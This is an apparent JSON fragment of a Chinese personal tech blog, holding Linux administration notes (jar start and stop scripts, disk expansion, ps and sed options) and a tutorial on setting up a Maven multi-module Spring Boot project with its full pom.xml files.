1、自己将项目（比如用springboot框架写的项目）打包成jar包，然后我们需要将它用软件传输到linux版本的服务器上（服务器提前安装好JDK\u0026gt;=1.8）。\n2、自己编写sh命令，用于启动和关闭项目，并打印日志信息到服务器本地。\n1）、start_项目名.sh文件\n1 2 3 4 5 6 7 8 9 #For shutting down the 你的项目名.jar pid=$(ps -ef | grep 你的项目名.jar| grep -v \u0026#34;grep\u0026#34; | awk \u0026#39;{print $2}\u0026#39;) kill -9 $pid echo \u0026#34;The 你的项目名.jar now has been shut down!\u0026#34; #For starting the 你的项目名.jar nohup java -jar 你的项目名.jar \u0026gt;你的项目日志名.output 2\u0026gt;\u0026amp;1 \u0026amp; echo \u0026#34;The 你的项目名.jar now is running!\u0026#34; tailf 你的项目日志名.output 2）、shutdown_项目名.sh文件\n1 2 3 4 #For shutting down the 你的项目名.jar pid=$(ps -ef | grep 你的项目名.jar| grep -v \u0026#34;grep\u0026#34; | awk \u0026#39;{print $2}\u0026#39;) kill -9 $pid echo \u0026#34;The 你的项目名.jar now has been shut down!\u0026#34; 3、将你的项目jar包、start_项目名.sh、shutdown_项目名.sh放在服务器的某一个文件夹下（他三个处于同一个目录）,此时，可以用控制台启动和关闭项目了。\n4、写完之后放到服务器上面要转换换行符\nhttps://blog.csdn.net/li_1303999/article/details/93159197\n文件下载 使用\nsz hadoop-mapreduce-examples-3.1.3.jar\n安装\nyum install -y lrzsz\n虚拟机扩容 https://blog.csdn.net/cc1949/article/details/89918775\n安装gparted\n1 yum install gparted 打开gparted\n1 sudo gparted 按照上述操作之后， df -h 还是没有变化\n输入 lsblk 发现分区并没有分完，虽然增加到sda2，但是每增加带centos-root中\n把用gparted划分的空间撤回，重新进行分区操作：\nhttps://blog.csdn.net/Akari0216/article/details/108944111\nhttps://zhuanlan.zhihu.com/p/450057653\n扩容之后\n==更新UUID值==\nhttps://blog.csdn.net/Chen_qi_hai/article/details/108814596\n查看mongodb安装路径 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #方法一 find / -name mongodb #方法二 locate mongodb #方法三 whereis mongodb #方法四 which mongodb 命令行注解 ps 1）ps -a 显示现行终端机下的所有程序，包括其他用户的程序。\n2）ps -A 显示所有程序。\n3）ps -c 列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。\n4）ps -e 此参数的效果和指定\u0026quot;A\u0026quot;参数相同。\n5）ps -e 列出程序时，显示每个程序所使用的环境变量。\n6）ps -f 用ASCII字符显示树状结构，表达程序间的相互关系。\n7）ps -H 显示树状结构，表示程序间的相互关系。\n8）ps -N 显示所有的程序，除了执行ps指令终端机下的程序之外。\n9）ps -s 采用程序信号的格式显示程序状况。\n10）ps - S 列出程序时，包括已中断的子程序资料。\n11）ps -t \u0026lt;终端机编号\u0026gt;指定终端机编号，并列出属于该终端机的程序的状况。\n12）ps -u username\ngrep 用于查找文件里符合条件的字符串\n管道符号 | 用法: command 1 | command 2 他的功能是把第一个命令command 1执行的结果作为command 2的输入传给command 2\nsed 参数说明：\n-i：使 sed 修改文件 -e","permalink":"https://chance7bin.github.io/posts/note/linux%E6%89%8B%E5%86%8C/","summary":"Ubuntu apt换国内源 https://blog.csdn.net/RadiantJeral/article/details/104184351 https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 打开终端输入命令下载vim工具 1 sudo apt-get install vim 1.备份 /etc/apt/sources.list 1 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 2.编辑 /etc/apt/sources.list 打开 /etc/apt/sources.list： 1","title":"Linux手册"},{"content":"新建工程和确定工程目录 项目分的模块为：\nlab-admin项目核心模块 lab-common项目通用工具模块 1. 新建工程及多Module子工程 一、新建一个Maven工程\n二、填写项目信息\n三、删除一些新建Maven工程的不需要的文件（src文件夹）\n四、在该工程下新建子Module\n五、填写子Module信息(也是一个Maven工程)\n成果：\n(对应pom.xml会自动写好子父对应关系)\n六、重复第五步，完成其他子Module创建\n除了Module名不同，其他操作都一样。\n2. 编写pom.xml文件 父级pom文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;opengms\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;description\u0026gt;OpenGMS 实验室\u0026lt;/description\u0026gt; \u0026lt;packaging\u0026gt;pom\u0026lt;/packaging\u0026gt; \u0026lt;modules\u0026gt; \u0026lt;module\u0026gt;lab-admin\u0026lt;/module\u0026gt; \u0026lt;module\u0026gt;lab-common\u0026lt;/module\u0026gt; \u0026lt;/modules\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;lab.version\u0026gt;1.0.0\u0026lt;/lab.version\u0026gt; \u0026lt;project.build.sourceEncoding\u0026gt;UTF-8\u0026lt;/project.build.sourceEncoding\u0026gt; \u0026lt;project.reporting.outputEncoding\u0026gt;UTF-8\u0026lt;/project.reporting.outputEncoding\u0026gt; \u0026lt;java.version\u0026gt;1.8\u0026lt;/java.version\u0026gt; \u0026lt;maven-jar-plugin.version\u0026gt;3.1.1\u0026lt;/maven-jar-plugin.version\u0026gt; \u0026lt;druid.version\u0026gt;1.2.11\u0026lt;/druid.version\u0026gt; \u0026lt;bitwalker.version\u0026gt;1.21\u0026lt;/bitwalker.version\u0026gt; \u0026lt;swagger.version\u0026gt;3.0.0\u0026lt;/swagger.version\u0026gt; \u0026lt;kaptcha.version\u0026gt;2.3.2\u0026lt;/kaptcha.version\u0026gt; \u0026lt;mybatis-spring-boot.version\u0026gt;2.2.2\u0026lt;/mybatis-spring-boot.version\u0026gt; \u0026lt;pagehelper.boot.version\u0026gt;1.4.3\u0026lt;/pagehelper.boot.version\u0026gt; \u0026lt;fastjson.version\u0026gt;2.0.9\u0026lt;/fastjson.version\u0026gt; \u0026lt;oshi.version\u0026gt;6.2.1\u0026lt;/oshi.version\u0026gt; \u0026lt;commons.io.version\u0026gt;2.11.0\u0026lt;/commons.io.version\u0026gt; \u0026lt;commons.fileupload.version\u0026gt;1.4\u0026lt;/commons.fileupload.version\u0026gt; \u0026lt;commons.collections.version\u0026gt;3.2.2\u0026lt;/commons.collections.version\u0026gt; \u0026lt;poi.version\u0026gt;4.1.2\u0026lt;/poi.version\u0026gt; \u0026lt;velocity.version\u0026gt;2.3\u0026lt;/velocity.version\u0026gt; \u0026lt;jwt.version\u0026gt;0.9.1\u0026lt;/jwt.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;!-- 依赖声明 --\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- SpringBoot的依赖配置--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5.14\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot集成mybatis框架 --\u0026gt; \u0026lt;!-- pagehelper依赖包含了mybatis的依赖 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.mybatis.spring.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;mybatis-spring-boot-starter\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;${mybatis-spring-boot.version}\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${pagehelper.boot.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 阿里JSON解析器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.fastjson2\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${fastjson.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- io常用工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-io\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-io\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${commons.io.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 文件上传工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-fileupload\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-fileupload\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${commons.fileupload.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- excel工具 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.poi\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;poi-ooxml\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${poi.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- Token生成与解析--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.jsonwebtoken\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jjwt\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${jwt.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 解析客户端操作系统、浏览器等 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;eu.bitwalker\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;UserAgentUtils\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${bitwalker.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 阿里数据库连接池 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;druid-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${druid.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 验证码 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.penggle\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;kaptcha\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${kaptcha.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 获取系统信息 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.oshi\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;oshi-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${oshi.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; \u0026lt;!--编译及打包项目配置--\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-compiler-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;source\u0026gt;${java.version}\u0026lt;/source\u0026gt; \u0026lt;target\u0026gt;${java.version}\u0026lt;/target\u0026gt; \u0026lt;encoding\u0026gt;${project.build.sourceEncoding}\u0026lt;/encoding\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;!-- 不执行单元测试，但会编译测试类并在target/test-classes目录下生成相应的class --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-surefire-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.22.2\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;skipTests\u0026gt;true\u0026lt;/skipTests\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;!--依赖下载镜像源--\u0026gt; \u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;public\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;aliyun nexus\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://maven.aliyun.com/repository/public\u0026lt;/url\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; \u0026lt;!--插件镜像源--\u0026gt; \u0026lt;pluginRepositories\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;public\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;aliyun nexus\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://maven.aliyun.com/repository/public\u0026lt;/url\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;/pluginRepositories\u0026gt; \u0026lt;/project\u0026gt; 注意点：\n**一、**Maven中的\u0026lt;dependencyManagement\u0026gt;元素提供了一种管理依赖版本号的方式。在\u0026lt;dependencyManagement\u0026gt;元素中声明所依赖的jar包的版本号等信息，那么所有子项目再次引入此依赖jar包时则无需显式的列出版本号。Maven会沿着父子层级向上寻找拥有\u0026lt;dependencyManagement\u0026gt;元素的项目，然后使用它指定的版本号。\n**二、**关于\n1 2 \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; 解释：\n这样\u0026lt;dependencies\u0026gt;里面的依赖如果没有版本信息，就可以参考引入的pom文件的\u0026lt;dependencyManagement\u0026gt;里面的版本信息。就像maven继承方法似的，在父pom的\u0026lt; dependencyManagement\u0026gt;里，放入版本信息，在若干子pom里都省去版本信息了。子 pom只需到父pom的\u0026lt;dependencyManagement\u0026gt;里，找到相应的artifactId和groupId的版本信息即可。\n**三、**关于\n1 \u0026lt;packaging\u0026gt;pom\u0026lt;/packaging\u0026gt; 解释：\n配置\u0026lt;packaging\u0026gt;pom\u0026lt;/packaging\u0026gt;的意思是使用maven分模块管理，都会有一个父级项目，pom文件一个重要的属性就是packaging（打包类型），一般来说所有的父级项目的packaging都为pom，packaging默认类型jar类型，如果不做配置，maven会将该项目打成jar包。\n其他可填值：\npom \u0026mdash;\u0026mdash;\u0026mdash;\u0026gt; 父类型都为pom类型\njar \u0026mdash;\u0026mdash;\u0026mdash;\u0026gt; 内部调用或者是作服务使用\nwar \u0026mdash;\u0026mdash;\u0026mdash;\u0026gt; 需要部署的项目\n**四、**Maven中optional和scope元素的使用\n解释：https://developer.aliyun.com/article/844335\nlab-admin的pom文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;artifactId\u0026gt;opengms\u0026lt;/artifactId\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;artifactId\u0026gt;lab-admin\u0026lt;/artifactId\u0026gt; \u0026lt;description\u0026gt; 管理模块 \u0026lt;/description\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- spring-boot-devtools --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;spring-boot-devtools\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026amp;lt;!\u0026amp;ndash; 表示依赖不会传递 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- SpringBoot Web容器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;!--以下是排除的组件--\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;!--排除默认自带的log组件--\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-logging\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--log4j2日志相关 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-log4j2\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot yml配置文件编写智能提示 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-configuration-processor\u0026lt;/artifactId\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--mysql驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--自动生成实体类get/set方法--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--项目common通用工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lab-common\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot 拦截器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-aop\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 阿里数据库连接池 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;druid-spring-boot-starter\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 验证码 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;com.github.penggle\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;kaptcha\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;exclusions\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;exclusion\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;javax.servlet-api\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/exclusion\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/exclusions\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 获取系统信息 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;com.github.oshi\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;oshi-core\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.1.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;fork\u0026gt;true\u0026lt;/fork\u0026gt; \u0026lt;!-- 如果没有该配置，devtools不会生效 --\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;!--打成可执行的运行包（.jar .war）--\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;repackage\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;/execution\u0026gt; \u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-war-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;failOnMissingWebXml\u0026gt;false\u0026lt;/failOnMissingWebXml\u0026gt; \u0026lt;warName\u0026gt;${project.artifactId}\u0026lt;/warName\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;finalName\u0026gt;${project.artifactId}\u0026lt;/finalName\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; lab-common的pom文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;artifactId\u0026gt;opengms\u0026lt;/artifactId\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;artifactId\u0026gt;lab-common\u0026lt;/artifactId\u0026gt; \u0026lt;description\u0026gt; common通用工具 \u0026lt;/description\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- Spring框架基本的核心工具 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-context-support\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringWeb模块 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- spring security 安全认证 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;!-- 自定义验证注解 --\u0026gt; \u0026lt;!--\u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;spring-boot-starter-validation\u0026lt;/artifactId\u0026gt;--\u0026gt; 